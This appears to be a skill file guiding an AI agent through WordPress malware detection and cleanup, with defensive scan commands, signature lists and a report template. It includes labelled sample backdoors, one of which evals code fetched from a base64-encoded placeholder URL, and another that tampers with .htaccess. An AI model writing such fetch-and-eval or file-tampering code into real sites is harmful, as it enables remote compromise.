---
name: wordpress-security-audit
description: Detects and removes WordPress malware, backdoors, and security vulnerabilities. Scans files for malicious code patterns, obfuscated scripts, suspicious functions, and unauthorized modifications. Fixes compromised files and documents all changes. Use when working with WordPress sites, detecting hacks, security audits, malware removal, or when suspicious files are found.
---

# WordPress Security Audit & Hack Detection

Specialist in WordPress security, malware detection, and remediation. Identifies compromised files, removes malicious code, and documents all security fixes.

## Quick Start

When auditing a WordPress installation:

1. **Scan for malicious patterns** - Search for common hack signatures
2. **Analyze suspicious files** - Examine flagged files in detail
3. **Remove malicious code** - Clean or quarantine compromised files
4. **Document all changes** - Create detailed security report

## Detection Patterns

### Critical Malware Signatures

Search for these patterns across PHP files:

**Obfuscated Code:**
- `base64_decode(` - Often used to hide malicious payloads
- `eval(` - Executes arbitrary code
- `preg_replace.*\/e` - Deprecated eval pattern
- `assert(` - Code execution
- `create_function(` - Dynamic function creation
- `str_rot13(` - ROT13 obfuscation
- `gzuncompress(` - Compressed payloads

**Suspicious Functions:**
- `exec(`, `system(`, `shell_exec(`, `passthru(` - Command execution
- `curl_exec(` - External data fetching (can be legitimate)
- `file_get_contents(` with external URLs
- `file_put_contents(` in suspicious locations

**Backdoor Indicators:**
- Files with random names (e.g., `Yi42JCOhH71.php`, `30d12509/about.php`)
- Files with `__` suffix (backup markers, e.g., `__10ac534`)
- Modified core WordPress files (`wp-config.php`, `wp-load.php`, `index.php`)
- Suspicious `.htaccess` modifications
- Unusual `php.ini` settings enabling dangerous functions

### File Location Red Flags

**Suspicious Locations:**
- Root directory files with random names
- `wp-content/uploads/` with PHP files
- `wp-content/themes/` with suspicious files
- `wp-content/plugins/` with unknown plugins
- Hidden directories (starting with `.`)

## Audit Workflow

### Step 1: Initial Scan

```bash
# Search for dangerous functions
grep -r "eval\|base64_decode\|exec\|system\|shell_exec" --include="*.php" .

# Find suspicious file names
find . -name "*.php" -type f | grep -E "(^[a-zA-Z0-9]{8,}\.php$|__[0-9a-f]+\.php)"
```

### Step 2: Analyze Suspicious Files

For each flagged file:

1. **Read the file** - Check for obfuscation
2. **Identify malicious code** - Look for:
   - Base64 encoded strings
   - External API calls to unknown domains
   - File manipulation (creating/modifying `.htaccess`)
   - Data exfiltration patterns
   - Hidden code in comments
3. **Check file permissions** - Suspicious files often have 0777 permissions

### Step 3: Remediation

**For Compromised Core Files:**
- Restore from clean WordPress installation
- Compare with official WordPress checksums
- Remove any injected code

**For Malicious Files:**
- **Quarantine first**: Move to `quarantine/` directory with timestamp
- **Delete**: Remove if confirmed malicious
- **Document**: Record file path, size, modification date, and malicious patterns found

**For Modified Configuration:**
- Review `.htaccess` for unauthorized redirects
- Check `wp-config.php` for suspicious includes
- Verify `php.ini` settings

### Step 4: Documentation

Create a security report documenting:

```markdown
# Security Audit Report - [Date]

## Files Scanned
- Total files: X
- PHP files: Y
- Suspicious files found: Z

## Malicious Files Detected

### [File Path]
- **Type**: Backdoor / Malware / Obfuscated Code
- **Patterns Found**: [list of suspicious patterns]
- **Action Taken**: [Quarantined/Deleted/Restored]
- **Details**: [description of malicious code]
- **File Hash**: [MD5/SHA256 if available]
- **Modified Date**: [timestamp]

## Remediation Actions

1. [Action taken]
2. [Action taken]

## Recommendations

- [Security hardening steps]
- [Monitoring suggestions]
```

## Common Malware Patterns

### Pattern 1: Obfuscated Backdoor

```php
// Malicious - DO NOT USE
$code = base64_decode('...');
eval($code);
```

**Fix**: Remove entire malicious block, restore clean file.

### Pattern 2: Remote Code Execution

```php
// Malicious - DO NOT USE
$api = base64_decode('aHR0cDovL2V4YW1wbGUuY29t');
$content = file_get_contents($api);
eval($content);
```

**Fix**: Remove external API calls, block domain in firewall.

### Pattern 3: File Manipulation

```php
// Malicious - DO NOT USE
file_put_contents('.htaccess', $malicious_content);
chmod('.htaccess', 0777);
```

**Fix**: Restore clean `.htaccess`, remove malicious code.

### Pattern 4: Hidden Code in Comments

```php
/* Normal comment */
eval(base64_decode('...')); // Hidden malicious code
```

**Fix**: Remove hidden code, verify file integrity.

## Verification Checklist

After remediation:

- [ ] All malicious files quarantined or deleted
- [ ] Core WordPress files restored from clean source
- [ ] `.htaccess` verified and cleaned
- [ ] `wp-config.php` checked for unauthorized includes
- [ ] File permissions corrected (644 for files, 755 for directories)
- [ ] Security report created
- [ ] WordPress core files verified against checksums
- [ ] Database checked for malicious entries (if applicable)

## Additional Resources

- For detailed malware patterns, see [malware-patterns.md](malware-patterns.md)
- For WordPress hardening guidelines, see [hardening.md](hardening.md)
- For common backdoor locations, see [backdoor-locations.md](backdoor-locations.md)

## Important Notes

- **Always backup** before making changes
- **Quarantine before deletion** - allows recovery if false positive
- **Document everything** - critical for security audits
- **Verify WordPress core** - compare checksums with official releases
- **Check database** - malware can inject into wp_options table
- **Review file timestamps** - helps identify infection timeline